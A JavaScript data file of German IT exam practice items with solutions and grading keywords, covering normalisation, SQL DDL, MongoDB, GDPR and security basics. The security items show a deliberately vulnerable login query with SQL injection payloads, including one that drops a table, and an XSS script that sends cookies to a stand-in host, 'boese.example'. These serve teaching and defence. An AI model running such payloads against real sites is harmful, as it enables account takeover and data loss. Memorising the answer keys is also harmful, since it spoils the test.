    context: `Ein Seminaranbieter verwaltet Teilnahmen bisher in einer Excel-Liste:
<table>
<tr><th>SemNr</th><th>Seminartitel</th><th>Termin</th><th>DozentNr</th><th>Dozent</th><th>TeilnNr</th><th>Teilnehmer</th><th>Firma</th><th>FirmaOrt</th><th>Bezahlt</th></tr>
<tr><td>S10</td><td>Scrum Basics</td><td>2026-11-10</td><td>D1</td><td>Fr. Roth</td><td>T5</td><td>Jan Berg</td><td>Alpha AG</td><td>Köln</td><td>ja</td></tr>
<tr><td>S10</td><td>Scrum Basics</td><td>2026-11-10</td><td>D1</td><td>Fr. Roth</td><td>T7</td><td>Eva Lang, Tim Lang</td><td>Beta GmbH</td><td>Bonn</td><td>nein</td></tr>
<tr><td>S12</td><td>Java I</td><td>2026-11-17</td><td>D2</td><td>Hr. Kaya</td><td>T5</td><td>Jan Berg</td><td>Alpha AG</td><td>Köln</td><td>ja</td></tr>
</table>
Ein Seminar hat genau einen Dozenten und einen Termin. Ein Teilnehmer arbeitet für genau eine Firma. Das Feld „Bezahlt“ bezieht sich auf die einzelne Teilnahme.`,
    question: `Überführen Sie die Daten schrittweise in die 1., 2. und 3. Normalform. Geben Sie für jede Stufe die Relationen mit Primär- und Fremdschlüsseln an und benennen Sie die beseitigten Abhängigkeiten.`,
    solution: `<b>1. NF</b> – Mehrfachwert „Eva Lang, Tim Lang“ auflösen (eigene Teilnehmernummer T8 für Tim Lang) und Namen atomar zerlegen:
<pre>Teilnahme(<u>SemNr, TeilnNr</u>, Seminartitel, Termin, DozentNr, Dozent,
          Vorname, Nachname, Firma, FirmaOrt, Bezahlt)</pre>
<b>2. NF</b> – partielle Abhängigkeiten vom zusammengesetzten Schlüssel entfernen:<br>
SemNr → Seminartitel, Termin, DozentNr, Dozent; TeilnNr → Vorname, Nachname, Firma, FirmaOrt
<pre>Seminar    (<u>SemNr</u>, Seminartitel, Termin, DozentNr, Dozent)
Teilnehmer (<u>TeilnNr</u>, Vorname, Nachname, Firma, FirmaOrt)
Teilnahme  (<u>↑SemNr, ↑TeilnNr</u>, Bezahlt)</pre>
<b>3. NF</b> – transitive Abhängigkeiten entfernen:<br>
SemNr → DozentNr → Dozent; TeilnNr → Firma → FirmaOrt
<pre>Dozent     (<u>DozentNr</u>, Name)
Seminar    (<u>SemNr</u>, Seminartitel, Termin, ↑DozentNr)
Firma      (<u>FirmaID</u>, Name, Ort)
Teilnehmer (<u>TeilnNr</u>, Vorname, Nachname, ↑FirmaID)
Teilnahme  (<u>↑SemNr, ↑TeilnNr</u>, Bezahlt)</pre>`,
    explanation: `Punkte gibt es pro Stufe: 1. NF (Atomarität, Mehrfachwerte), 2. NF (partielle Abhängigkeiten von SemNr bzw. TeilnNr), 3. NF (transitive Abhängigkeiten Dozent und Firma). „Bezahlt“ hängt vom gesamten Schlüssel ab und bleibt in Teilnahme. Für Firma ist ein künstlicher Schlüssel sinnvoll, da Firmennamen nicht eindeutig sein müssen.`,
    keywords: ["atomar", "teilnahme", "seminar", "teilnehmer", "dozent", "firma", "partiell|teil des schlüssels|2. nf", "transitiv", "bezahlt", "↑|fk|fremdschlüssel"],
    tags: ["normalisierung", "relationenmodell"]
  },
  {
    id: "ga1-datenmodell-015", part: "GA1", topic: "ga1-datenmodell", type: "code", difficulty: 2, points: 8, lang: "sql",
    context: `Relationenmodell eines Fuhrparks:
<pre>Fahrzeug  (<u>Kennzeichen</u>, Modell, Erstzulassung, Kilometerstand)
Fahrer    (<u>PersNr</u>, Name, Fuehrerscheinklasse)
Fahrt     (<u>FahrtID</u>, ↑Kennzeichen, ↑PersNr, Datum, Km_Start, Km_Ende)</pre>`,
    question: `Erstellen Sie die SQL-DDL-Anweisungen für die drei Tabellen mit geeigneten Datentypen, Primär- und Fremdschlüsseln sowie einer sinnvollen CHECK-Bedingung.`,
    solution: `<pre><code>CREATE TABLE Fahrzeug (
  Kennzeichen     VARCHAR(12)  PRIMARY KEY,
  Modell          VARCHAR(50)  NOT NULL,
  Erstzulassung   DATE,
  Kilometerstand  INTEGER      CHECK (Kilometerstand &gt;= 0)
);

CREATE TABLE Fahrer (
  PersNr               INTEGER     PRIMARY KEY,
  Name                 VARCHAR(80) NOT NULL,
  Fuehrerscheinklasse  VARCHAR(5)
);

CREATE TABLE Fahrt (
  FahrtID      INTEGER     PRIMARY KEY,
  Kennzeichen  VARCHAR(12) NOT NULL,
  PersNr       INTEGER     NOT NULL,
  Datum        DATE        NOT NULL,
  Km_Start     INTEGER     NOT NULL,
  Km_Ende      INTEGER,
  CHECK (Km_Ende IS NULL OR Km_Ende &gt;= Km_Start),
  FOREIGN KEY (Kennzeichen) REFERENCES Fahrzeug(Kennzeichen),
  FOREIGN KEY (PersNr)      REFERENCES Fahrer(PersNr)
);</code></pre>`,
    explanation: `Reihenfolge beachten: Erst die referenzierten Tabellen (Fahrzeug, Fahrer), dann Fahrt. Kennzeichen als VARCHAR (Buchstaben, Bindestrich). Fehler: FK-Spalte mit anderem Datentyp als der PK anlegen.`,
    keywords: ["create table", "primary key", "foreign key", "references", "varchar", "integer|int", "date", "check", "not null"],
    tags: ["ddl", "relationenmodell"]
  },
  {
    id: "ga1-datenmodell-016", part: "GA1", topic: "ga1-datenmodell", type: "code", difficulty: 2, points: 6, lang: "pseudocode",
    context: `Ein Lieferdienst speichert Bestellungen in MongoDB. Eine Bestellung (Nr. 7781 vom 2026-11-20) des Kunden Murat Demir (Kundennr. 311, Lindenstr. 4, 53111 Bonn) enthält 2× „Pizza Margherita“ à 8,50 € und 1× „Tiramisu“ à 4,90 €. Die Bestellung soll als ein Dokument abgelegt werden.`,
    question: `Modellieren Sie das JSON-Dokument der Bestellung. Erläutern Sie kurz, warum hier eingebettete Dokumente statt Referenzen sinnvoll sind.`,
    solution: `<pre>{
  "_id": 7781,
  "datum": "2026-11-20",
  "kunde": {
    "kundenNr": 311,
    "name": "Murat Demir",
    "adresse": { "strasse": "Lindenstr. 4", "plz": "53111", "ort": "Bonn" }
  },
  "positionen": [
    { "artikel": "Pizza Margherita", "menge": 2, "einzelpreis": 8.50 },
    { "artikel": "Tiramisu",         "menge": 1, "einzelpreis": 4.90 }
  ],
  "gesamt": 21.90,
  "status": "in Zubereitung"
}</pre>
<b>Einbettung</b>, weil Positionen und Lieferadresse immer zusammen mit der Bestellung gelesen werden (ein Zugriff, keine Joins) und die Lieferadresse zum Bestellzeitpunkt „eingefroren“ werden soll (historisch korrekt, auch wenn der Kunde später umzieht). Stammdaten mit vielen Verweisen (z.&nbsp;B. Artikelkatalog) würde man dagegen referenzieren.`,
    explanation: `Gesamtsumme: 2 × 8,50 + 4,90 = 21,90 €. Geldbeträge sollten in MongoDB als Decimal128 oder in Cent (Integer) gespeichert werden, um Rundungsfehler zu vermeiden.`,
    keywords: ["{", "[", "positionen", "kunde", "menge", "einzelpreis|preis", "eingebettet|einbettung|embedded", "join|ein zugriff|zusammen gelesen", "21.90|21,90"],
    tags: ["nosql", "json"]
  },
  {
    id: "ga1-datenmodell-017", part: "GA1", topic: "ga1-datenmodell", type: "order", difficulty: 1, points: 3,
    question: `Bringen Sie die Phasen des Datenbankentwurfs in die richtige Reihenfolge.`,
    items: [
      `Anforderungsanalyse (Informationsbedarf ermitteln)`,
      `Konzeptioneller Entwurf (ER-Modell)`,
      `Logischer Entwurf (Relationenmodell)`,
      `Normalisierung des Relationenmodells`,
      `Physischer Entwurf (Datentypen, Indizes, DDL für das konkrete DBMS)`,
      `Implementierung und Test mit Testdaten`
    ],
    solution: `Anforderungsanalyse → konzeptionelles Modell (ERM, DBMS-unabhängig) → logisches Modell (Tabellen/Relationen) → Normalisierung → physisches Modell (DBMS-spezifisch) → Implementierung/Test.`,
    explanation: `Das ERM ist unabhängig vom Datenbanksystem; erst der physische Entwurf berücksichtigt das konkrete DBMS (z.&nbsp;B. MySQL vs. PostgreSQL).`,
    tags: ["datenbankentwurf"]
  },
  {
    id: "ga1-datenmodell-018", part: "GA1", topic: "ga1-datenmodell", type: "numeric", difficulty: 2, points: 3,
    context: `Ein ER-Modell enthält die Entitätstypen Kunde, Auftrag, Artikel, Lieferant und Lager. Beziehungen:
<ul><li>Kunde 1:n Auftrag</li><li>Auftrag n:m Artikel</li><li>Artikel n:m Lieferant</li><li>Lager 1:n Artikel</li><li>Kunde 1:1 Kundenkarte (Kundenkarte ist zusätzlicher Entitätstyp, wird als eigene Tabelle umgesetzt)</li></ul>`,
    question: `Wie viele Tabellen entstehen bei der Überführung in das Relationenmodell?`,
    answer: 8, tolerance: 0, unit: "Tabellen",
    solution: `6 Entitätstypen (Kunde, Auftrag, Artikel, Lieferant, Lager, Kundenkarte) = 6 Tabellen<br>+ 2 Zwischentabellen für die beiden n:m-Beziehungen (Auftragsposition, Artikel_Lieferant)<br>= <b>8 Tabellen</b>. 1:n- und 1:1-Beziehungen werden über Fremdschlüssel abgebildet und erzeugen keine eigene Tabelle.`,
    explanation: `Typischer Fehler: Kundenkarte übersehen oder für jede Beziehung eine Tabelle anlegen.`,
    tags: ["relationenmodell"]
  },
  {
    id: "ga1-datenmodell-019", part: "GA1", topic: "ga1-datenmodell", type: "text", difficulty: 1, points: 4,
    question: `Erklären Sie die Begriffe <b>Primärschlüssel</b>, <b>Fremdschlüssel</b>, <b>zusammengesetzter Schlüssel</b> und <b>Surrogatschlüssel</b> jeweils mit einem Beispiel.`,
    solution: `<ul><li><b>Primärschlüssel</b>: Attribut(kombination), das jeden Datensatz einer Tabelle eindeutig identifiziert; eindeutig und NOT NULL. Beispiel: <code>KundenNr</code> in Kunde.</li>
<li><b>Fremdschlüssel</b>: Attribut, das auf den Primärschlüssel einer (anderen) Tabelle verweist und so Beziehungen herstellt. Beispiel: <code>KundenNr</code> in Bestellung.</li>
<li><b>Zusammengesetzter Schlüssel</b>: Primärschlüssel aus mehreren Attributen. Beispiel: <code>(BestellNr, ArtikelNr)</code> in Bestellposition.</li>
<li><b>Surrogatschlüssel</b> (künstlicher Schlüssel): fachlich bedeutungsloser, vom System erzeugter Wert (z.&nbsp;B. fortlaufende ID, UUID), statt eines natürlichen Schlüssels wie E-Mail-Adresse oder Kennzeichen, die sich ändern können.</li></ul>`,
    explanation: `Natürliche Schlüssel (Steuer-ID, E-Mail) sind problematisch, wenn sie sich ändern können oder personenbezogen sind.`,
    keywords: ["eindeutig", "identifiziert|identifizieren", "verweist|referenziert|beziehung", "mehreren attributen|mehrere attribute|kombination", "künstlich|kuenstlich|id|uuid", "not null|nicht leer"],
    tags: ["schluessel"]
  }
);

// ===================== ga1-sicherheit =====================
AP2.questions.push(
  {
    id: "ga1-sicherheit-001", part: "GA1", topic: "ga1-sicherheit", type: "mc", difficulty: 1, points: 2,
    context: `Für eine Studie werden Patientendaten exportiert. Name und Versichertennummer werden durch eine Kennung „P-0815“ ersetzt; eine Zuordnungstabelle Kennung → Patient verbleibt verschlüsselt beim Krankenhaus.`,
    question: `Um welches Verfahren handelt es sich und gilt die DSGVO für den Export weiterhin?`,
    options: [
      `Anonymisierung – die DSGVO gilt nicht mehr.`,
      `Pseudonymisierung – die DSGVO gilt weiterhin.`,
      `Verschlüsselung – die DSGVO gilt nicht mehr.`,
      `Anonymisierung – die DSGVO gilt weiterhin.`
    ],
    correct: [1],
    solution: `<b>Pseudonymisierung</b>: Mithilfe der Zuordnungstabelle ist der Personenbezug wiederherstellbar. Pseudonymisierte Daten sind weiterhin personenbezogene Daten (Art. 4 Nr. 5 DSGVO), die DSGVO gilt also. Pseudonymisierung ist aber eine anerkannte Schutzmaßnahme (TOM).`,
    explanation: `Nur bei echter Anonymisierung (Personenbezug kann von niemandem mit vertretbarem Aufwand wiederhergestellt werden) fällt die DSGVO weg. Gesundheitsdaten gehören zudem zu den besonderen Kategorien nach Art. 9.`,
    tags: ["dsgvo", "pseudonymisierung"]
  },
  {
    id: "ga1-sicherheit-002", part: "GA1", topic: "ga1-sicherheit", type: "mc", difficulty: 1, points: 2,
    context: `Am Freitag um 16:00 Uhr stellt der Administrator der <b>Möbelhaus Krämer GmbH</b> fest, dass Unbekannte die Kundendatenbank (Namen, Adressen, Bestellhistorie) kopiert haben.`,
    question: `Bis wann muss die Datenpanne gemäß DSGVO spätestens der Aufsichtsbehörde gemeldet werden?`,
    options: [
      `Unverzüglich, spätestens bis Montag 16:00 Uhr (72 Stunden nach Bekanntwerden)`,
      `Innerhalb von 24 Stunden, also bis Samstag 16:00 Uhr`,
      `Innerhalb von 14 Tagen`,
      `Nur wenn Kreditkartendaten betroffen sind`
    ],
    correct: [0],
    solution: `Nach <b>Art. 33 DSGVO</b> ist eine Verletzung des Schutzes personenbezogener Daten unverzüglich und möglichst binnen <b>72 Stunden</b> nach Bekanntwerden der Aufsichtsbehörde zu melden – auch am Wochenende. Fristende: Montag, 16:00 Uhr. Bei voraussichtlich hohem Risiko sind zusätzlich die Betroffenen zu benachrichtigen (Art. 34).`,
    explanation: `Die Meldung entfällt nur, wenn voraussichtlich kein Risiko für die Betroffenen besteht – bei kopierten Kundendaten ist das nicht der Fall. Verspätete Meldungen müssen begründet werden.`,
    tags: ["dsgvo", "meldepflicht"]
  },
  {
    id: "ga1-sicherheit-003", part: "GA1", topic: "ga1-sicherheit", type: "mc", difficulty: 2, points: 2,
    question: `Frau Lorenz möchte einen Vertrag digital signieren und an Herrn Brandt senden. Welcher Ablauf ist korrekt?`,
    options: [
      `Frau Lorenz verschlüsselt das Dokument mit dem öffentlichen Schlüssel von Herrn Brandt.`,
      `Frau Lorenz bildet einen Hashwert des Dokuments und verschlüsselt diesen mit ihrem privaten Schlüssel; Herr Brandt prüft mit ihrem öffentlichen Schlüssel.`,
      `Frau Lorenz signiert mit ihrem öffentlichen Schlüssel; Herr Brandt prüft mit seinem privaten Schlüssel.`,
      `Beide verwenden denselben geheimen symmetrischen Schlüssel.`
    ],
    correct: [1],
    solution: `Signieren: Hash (z.&nbsp;B. SHA-256) des Dokuments bilden und mit dem <b>privaten Schlüssel des Absenders</b> signieren. Prüfen: Empfänger entschlüsselt die Signatur mit dem <b>öffentlichen Schlüssel des Absenders</b>, berechnet den Hash selbst und vergleicht. Stimmen beide überein → Integrität, Authentizität, Nichtabstreitbarkeit.`,
    explanation: `Antwort A beschreibt Verschlüsselung (Vertraulichkeit), keine Signatur. Merke: Verschlüsseln mit Public Key des Empfängers, Signieren mit Private Key des Absenders.`,
    tags: ["signatur", "kryptografie"]
  },
  {
    id: "ga1-sicherheit-004", part: "GA1", topic: "ga1-sicherheit", type: "mc", difficulty: 2, points: 2,
    context: `Ein Unternehmen sichert sonntags voll und Montag bis Samstag jeweils <b>differenziell</b>. Am Donnerstagmorgen fällt der Server aus; die letzte Sicherung lief Mittwochabend.`,
    question: `Welche Sicherungen werden für die Wiederherstellung benötigt?`,
    options: [
      `Nur die Vollsicherung vom Sonntag`,
      `Die Vollsicherung vom Sonntag und die differenziellen Sicherungen von Montag, Dienstag und Mittwoch`,
      `Die Vollsicherung vom Sonntag und die differenzielle Sicherung vom Mittwoch`,
      `Nur die differenzielle Sicherung vom Mittwoch`
    ],
    correct: [2],
    solution: `Eine differenzielle Sicherung enthält alle Änderungen seit der <b>letzten Vollsicherung</b>. Benötigt werden daher die <b>Vollsicherung (Sonntag) + die letzte differenzielle Sicherung (Mittwoch)</b>.`,
    explanation: `Bei inkrementeller Sicherung wären Vollsicherung + alle Inkremente Mo, Di, Mi in der richtigen Reihenfolge nötig (Antwort B). Differenzielle Sicherungen wachsen von Tag zu Tag, die Wiederherstellung ist dafür einfacher.`,
    tags: ["backup"]
  },
  {
    id: "ga1-sicherheit-005", part: "GA1", topic: "ga1-sicherheit", type: "multi", difficulty: 2, points: 4,
    question: `Welche Maßnahmen dienen <b>primär</b> dem Schutzziel <b>Verfügbarkeit</b>? (Mehrfachauswahl)`,
    options: [
      `Unterbrechungsfreie Stromversorgung (USV) für den Serverraum`,
      `Verschlüsselung der Festplatten mit AES-256`,
      `RAID 1 / gespiegelte Datenträger`,
      `Regelmäßige Datensicherung nach der 3-2-1-Regel`,
      `Digitale Signatur von E-Mails`,
      `Lastverteilung (Load Balancing) auf mehrere Server`
    ],
    correct: [0, 2, 3, 5],
    solution: `Verfügbarkeit: USV, RAID/Redundanz, Backups, Load Balancing (auch Cluster, Notfallplan, DDoS-Schutz).<br>Festplattenverschlüsselung → <b>Vertraulichkeit</b>; digitale Signatur → <b>Integrität/Authentizität</b>.`,
    explanation: `RAID ersetzt kein Backup: Versehentliches Löschen oder Ransomware wird auf beide Platten gespiegelt.`,
    tags: ["schutzziele"]
  },
  {
    id: "ga1-sicherheit-006", part: "GA1", topic: "ga1-sicherheit", type: "multi", difficulty: 2, points: 4,
    question: `Welche Aussagen zur sicheren Speicherung von Passwörtern sind korrekt? (Mehrfachauswahl)`,
    options: [
      `Passwörter sollten mit einer langsamen, speziell dafür entwickelten Funktion wie Argon2 oder bcrypt gehasht werden.`,
      `Ein Salt ist ein zufälliger Wert pro Benutzer, der zusammen mit dem Hash gespeichert wird und Rainbow-Table-Angriffe verhindert.`,
      `Ein Pepper ist ein geheimer, systemweiter Wert, der nicht in der Datenbank gespeichert wird.`,
      `Passwörter sollten mit AES verschlüsselt gespeichert werden, damit sie bei Bedarf dem Benutzer zugeschickt werden können.`,
      `SHA-256 ohne Salt ist für Passwörter ausreichend, da SHA-256 nicht gebrochen ist.`,
      `Durch das Salt erhalten zwei Benutzer mit gleichem Passwort unterschiedliche Hashwerte.`
    ],
    correct: [0, 1, 2, 5],
    solution: `Richtig: langsame Hashverfahren (Argon2id, bcrypt, scrypt, PBKDF2) mit Kostenfaktor; Salt je Benutzer gegen Rainbow Tables und identische Hashes; Pepper als zusätzliches Geheimnis außerhalb der DB.<br>Falsch: Passwörter niemals umkehrbar speichern (Verschlüsselung) – stattdessen Passwort-Reset-Link. Schnelle Hashes wie SHA-256 ermöglichen Milliarden Rateversuche pro Sekunde (GPU-Brute-Force), ohne Salt zusätzlich Rainbow Tables.`,
    explanation: `Bei bcrypt/Argon2 ist das Salt bereits Teil des Ergebnis-Strings (z.&nbsp;B. <code>$2b$12$...</code>).`,
    tags: ["passwort", "hash"]
  },
  {
    id: "ga1-sicherheit-007", part: "GA1", topic: "ga1-sicherheit", type: "multi", difficulty: 1, points: 3,
    context: `Eine Personalverwaltungssoftware speichert verschiedene Mitarbeiterdaten.`,
    question: `Welche Daten gehören zu den <b>besonderen Kategorien personenbezogener Daten</b> nach Art. 9 DSGVO? (Mehrfachauswahl)`,
    options: [`Krankheitstage mit Diagnose`, `Gewerkschaftszugehörigkeit`, `Bankverbindung`, `Religionszugehörigkeit (für die Kirchensteuer)`, `Privatanschrift`, `Fingerabdruck für die Zeiterfassung`],
    correct: [0, 1, 3, 5],
    solution: `Besondere Kategorien: Gesundheitsdaten, Gewerkschaftszugehörigkeit, religiöse/weltanschauliche Überzeugungen, biometrische Daten zur eindeutigen Identifizierung, außerdem ethnische Herkunft, politische Meinungen, genetische Daten, Sexualleben/sexuelle Orientierung.<br>Bankverbindung und Anschrift sind „normale“ personenbezogene Daten (die Bankverbindung ist dennoch schutzbedürftig).`,
    explanation: `Für besondere Kategorien gilt ein grundsätzliches Verarbeitungsverbot mit Ausnahmen (z.&nbsp;B. arbeitsrechtliche Pflichten, ausdrückliche Einwilligung) und erhöhter Schutzbedarf.`,
    tags: ["dsgvo"]
  },
  {
    id: "ga1-sicherheit-008", part: "GA1", topic: "ga1-sicherheit", type: "text", difficulty: 2, points: 6,
    context: `Bei einem Code-Review fällt folgende Login-Prüfung auf:
<pre><code>String sql = "SELECT * FROM benutzer WHERE login = '" + login
           + "' AND passwort = '" + passwort + "'";
ResultSet rs = statement.executeQuery(sql);</code></pre>`,
    question: `Erläutern Sie, welche Sicherheitslücke vorliegt, zeigen Sie an einem Beispiel, wie sie ausgenutzt werden kann, und nennen Sie drei Gegenmaßnahmen.`,
    solution: `<b>Sicherheitslücke: SQL-Injection.</b> Benutzereingaben werden ungeprüft per String-Verkettung in die SQL-Anweisung eingebaut, sodass ein Angreifer die Struktur der Abfrage verändern kann.<br>
<b>Beispiel:</b> Eingabe Login <code>admin' --</code> und beliebiges Passwort ergibt:<br>
<code>SELECT * FROM benutzer WHERE login = 'admin' --' AND passwort = '...'</code><br>
Der Rest nach <code>--</code> ist Kommentar → Anmeldung als admin ohne Passwort. Alternativ <code>' OR '1'='1</code> → alle Datensätze; mit <code>'; DROP TABLE benutzer; --</code> ggf. Datenverlust.<br>
<b>Gegenmaßnahmen:</b>
<ul><li><b>Prepared Statements</b>/parametrisierte Abfragen (<code>WHERE login = ?</code>) – wichtigste Maßnahme.</li>
<li>Eingabevalidierung (Whitelist, Länge, erlaubte Zeichen) bzw. ORM-Framework.</li>
<li>Datenbankbenutzer mit minimalen Rechten (Least Privilege), keine detaillierten DB-Fehlermeldungen an den Client, WAF.</li>
<li>Zusätzlich: Passwörter nicht im Klartext vergleichen, sondern gehasht (bcrypt/Argon2) speichern und im Code prüfen.</li></ul>`,
    explanation: `Escaping von Sonderzeichen gilt als schwächere Maßnahme. Der Hinweis auf Klartextpasswörter bringt in der Prüfung oft Zusatzpunkte.`,
    keywords: ["sql-injection|sql injection", "prepared statement|parametrisiert|platzhalter", "' or|--|kommentar", "verkettung|konkaten|ungeprüft|ungefiltert", "validierung|whitelist|prüfung der eingabe", "rechte|least privilege", "hash"],
    tags: ["owasp", "sql-injection"]
  },
  {
    id: "ga1-sicherheit-009", part: "GA1", topic: "ga1-sicherheit", type: "text", difficulty: 3, points: 8,
    context: `Im Kundenforum der <b>Reiseportal24 GmbH</b> können angemeldete Nutzer Beiträge verfassen, die ungefiltert als HTML angezeigt werden. Die Session-ID wird in einem Cookie ohne weitere Attribute gespeichert. Änderungen der E-Mail-Adresse erfolgen über ein einfaches Formular per <code>POST /profil/email</code>.`,
    question: `Erläutern Sie die Angriffe <b>Cross-Site-Scripting (XSS)</b> und <b>Cross-Site Request Forgery (CSRF)</b> in diesem Szenario und nennen Sie jeweils zwei Gegenmaßnahmen.`,
    solution: `<b>XSS (hier: persistentes/stored XSS):</b> Ein Angreifer schreibt einen Beitrag mit Skriptcode, z.&nbsp;B. <code>&lt;script&gt;fetch('https://boese.example/?c='+document.cookie)&lt;/script&gt;</code>. Der Code wird gespeichert und im Browser jedes Lesers ausgeführt → Diebstahl der Session-ID (Session Hijacking), Manipulation der Seite, Phishing.<br>
Gegenmaßnahmen: <b>kontextabhängiges Output-Encoding</b> (<code>&lt;</code> → <code>&amp;lt;</code>) bzw. HTML-Sanitizing, Eingabevalidierung, <b>Content-Security-Policy</b>-Header, Cookie-Flag <b>HttpOnly</b> (Skripte können das Cookie nicht lesen).<br><br>
<b>CSRF:</b> Ein eingeloggter Nutzer besucht eine präparierte fremde Seite, die unbemerkt ein Formular an <code>POST /profil/email</code> absendet. Der Browser schickt das Session-Cookie automatisch mit → Server ändert die E-Mail-Adresse auf die des Angreifers, der danach per „Passwort vergessen“ das Konto übernimmt.<br>
Gegenmaßnahmen: <b>CSRF-Token</b> (zufälliger, an die Session gebundener Wert im Formular), Cookie-Attribut <b>SameSite=Strict/Lax</b>, erneute Passworteingabe bei sicherheitskritischen Änderungen, Prüfen von Origin/Referer-Header.`,
    explanation: `Abgrenzung: Bei XSS wird fremder Code im Kontext der vertrauenswürdigen Seite ausgeführt; bei CSRF wird das Vertrauen der Seite in den Browser des Nutzers missbraucht – es wird kein Code eingeschleust, sondern eine Anfrage untergeschoben.`,
    keywords: ["xss|cross-site-scripting|cross site scripting", "script|skript|javascript", "encoding|escaping|kodier|maskier", "content-security-policy|csp", "httponly", "csrf|cross-site request forgery", "token", "samesite", "cookie"],
    tags: ["owasp", "xss", "csrf"]
  },
  {
    id: "ga1-sicherheit-010", part: "GA1", topic: "ga1-sicherheit", type: "text", difficulty: 2, points: 6,
    question: `Erläutern Sie das Prinzip der <b>hybriden Verschlüsselung</b>. Gehen Sie dabei auf die Nachteile rein symmetrischer und rein asymmetrischer Verfahren ein und nennen Sie ein Einsatzbeispiel.`,
    solution: `<b>Symmetrisch</b> (z.&nbsp;B. AES): ein gemeinsamer geheimer Schlüssel; sehr schnell, aber <b>Schlüsselaustauschproblem</b> (Schlüssel muss sicher übertragen werden) und hohe Schlüsselanzahl n·(n−1)/2.<br>
<b>Asymmetrisch</b> (z.&nbsp;B. RSA, ECC): öffentlicher/privater Schlüssel; kein Austausch eines Geheimnisses nötig, aber <b>rechenintensiv/langsam</b> und für große Datenmengen ungeeignet.<br>
<b>Hybrid:</b> Kombination beider Vorteile:
<ol><li>Sender erzeugt einen zufälligen symmetrischen <b>Sitzungsschlüssel</b>.</li>
<li>Die eigentlichen Daten werden schnell <b>symmetrisch</b> mit diesem Sitzungsschlüssel verschlüsselt.</li>
<li>Der Sitzungsschlüssel wird <b>asymmetrisch</b> mit dem öffentlichen Schlüssel des Empfängers verschlüsselt (bzw. per Diffie-Hellman ausgehandelt) und mitgeschickt.</li>
<li>Der Empfänger entschlüsselt den Sitzungsschlüssel mit seinem privaten Schlüssel und damit die Daten.</li></ol>
<b>Einsatz:</b> TLS/HTTPS, S/MIME, PGP/GPG, VPN (IPsec).`,
    explanation: `Bei TLS 1.3 wird der Sitzungsschlüssel per (EC)DHE ausgehandelt statt mit RSA verschlüsselt (Forward Secrecy) – das Prinzip „asymmetrisch für den Schlüssel, symmetrisch für die Daten“ bleibt.`,
    keywords: ["symmetrisch", "asymmetrisch", "sitzungsschlüssel|session key|sitzungsschluessel", "schlüsselaustausch|schluesselaustausch|austausch", "langsam|rechenintensiv|performance", "öffentlich|public", "privat|private", "tls|https|pgp|s/mime"],
    tags: ["kryptografie"]
  },
  {
    id: "ga1-sicherheit-011", part: "GA1", topic: "ga1-sicherheit", type: "text", difficulty: 2, points: 6,
    context: `Ihr Unternehmen entwickelt für die <b>Sportverein Blau-Weiß e.V.</b> eine Mitglieder-App. Der Vorstand wünscht: Erfassung von Name, Adresse, Geburtsdatum, Bankverbindung, Telefonnummer, Religionszugehörigkeit („falls mal interessant“), dauerhafte Speicherung aller Daten auch nach Austritt sowie Weitergabe der E-Mail-Adressen an einen Sportartikelhändler für Werbung.`,
    question: `Beurteilen Sie die Wünsche anhand von drei Grundsätzen aus Art. 5 DSGVO und machen Sie jeweils einen Verbesserungsvorschlag.`,
    solution: `<ul>
<li><b>Datenminimierung</b>: Es dürfen nur Daten erhoben werden, die für den Zweck (Mitgliederverwaltung, Beitragseinzug) erforderlich sind. Die Religionszugehörigkeit ist nicht erforderlich (zudem besondere Kategorie nach Art. 9) → nicht erfassen.</li>
<li><b>Speicherbegrenzung</b>: Daten dürfen nur so lange gespeichert werden, wie es für den Zweck nötig ist. → Nach Austritt löschen bzw. nur noch die steuer-/handelsrechtlich aufbewahrungspflichtigen Daten (z.&nbsp;B. Beitragsbuchungen) sperren und nach Fristablauf löschen; Löschkonzept umsetzen.</li>
<li><b>Zweckbindung</b>: Daten dürfen nur für festgelegte, eindeutige Zwecke verarbeitet werden. Weitergabe an einen Händler für Werbung ist ein anderer Zweck → nur mit ausdrücklicher, freiwilliger Einwilligung (Opt-in, widerrufbar), sonst unterlassen.</li>
<li>Weitere: <b>Transparenz</b> (Datenschutzerklärung, Informationspflicht Art. 13), <b>Integrität und Vertraulichkeit</b> (Bankdaten verschlüsselt speichern, Zugriff nur Kassenwart), <b>Rechtmäßigkeit</b> (Art. 6 – Vertrag/Mitgliedschaft als Rechtsgrundlage).</li></ul>`,
    explanation: `Ideal: Grundsatz nennen + kurz definieren + auf den Fall anwenden + Verbesserung. Reines Aufzählen der Grundsätze ergibt nur Teilpunkte.`,
    keywords: ["datenminimierung", "speicherbegrenzung|löschen|loeschen", "zweckbindung|zweck", "einwilligung", "religion|art. 9|besondere", "transparenz", "vertraulichkeit|verschlüssel", "rechtmäßigkeit|art. 6"],
    tags: ["dsgvo"]
  },
  {
    id: "ga1-sicherheit-012", part: "GA1", topic: "ga1-sicherheit", type: "text", difficulty: 2, points: 6,
    context: `Die <b>Steuerkanzlei Hoffmann</b> betreibt einen eigenen Server mit Mandantendaten im Büro. Bei einem Datenschutz-Audit wird nach den technischen und organisatorischen Maßnahmen (TOMs) gefragt.`,
    question: `Nennen Sie sechs konkrete TOMs für die Kanzlei und ordnen Sie diese jeweils einer Kontrollart bzw. einem Schutzziel zu.`,
    solution: `<table>
<tr><th>Maßnahme</th><th>Kontrollart / Schutzziel</th></tr>
<tr><td>Serverraum abschließbar, Zutritt nur mit Chipkarte, Besucherprotokoll</td><td>Zutrittskontrolle</td></tr>
<tr><td>Individuelle Benutzerkonten, starke Passwörter, MFA, automatische Bildschirmsperre</td><td>Zugangskontrolle</td></tr>
<tr><td>Rollen- und Berechtigungskonzept (Need-to-know), jeder Steuerberater nur seine Mandanten</td><td>Zugriffskontrolle</td></tr>
<tr><td>TLS-verschlüsselte Übertragung, verschlüsselte E-Mails, verschlüsselte USB-Sticks/Laptops</td><td>Weitergabekontrolle / Vertraulichkeit</td></tr>
<tr><td>Protokollierung, wer wann welche Daten geändert hat (Audit-Log)</td><td>Eingabekontrolle / Integrität</td></tr>
<tr><td>Tägliches Backup nach 3-2-1-Regel, USV, RAID, Virenschutz, Notfallplan</td><td>Verfügbarkeitskontrolle</td></tr>
<tr><td>AV-Verträge mit Dienstleistern (z.&nbsp;B. IT-Wartung)</td><td>Auftragskontrolle</td></tr>
<tr><td>Datenschutzschulungen, Verpflichtung auf Vertraulichkeit, Clean-Desk-Policy</td><td>organisatorisch</td></tr>
</table>`,
